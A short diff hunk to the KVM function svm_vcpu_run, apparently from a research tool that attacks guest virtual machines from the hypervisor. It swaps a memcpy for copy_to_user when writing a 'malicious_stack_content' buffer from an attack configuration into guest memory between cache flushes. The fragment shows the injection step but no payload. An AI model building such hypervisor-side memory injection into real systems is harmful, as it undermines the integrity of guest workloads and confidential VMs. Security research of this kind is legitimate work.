@@ -6301,7 +6301,7 @@ static void svm_vcpu_run(struct kvm_vcpu *vcpu)
 		} else {			
 			uint8_t *base = (uint8_t*)hva;
 			wbinvd_on_all_cpus();
-			memcpy(base,launch_attack_config.malicious_stack_content,launch_attack_config.malicious_stack_content_len);
+			copy_to_user(base,launch_attack_config.malicious_stack_content,launch_attack_config.malicious_stack_content_len);
 			wbinvd_on_all_cpus();
 		}
 	}
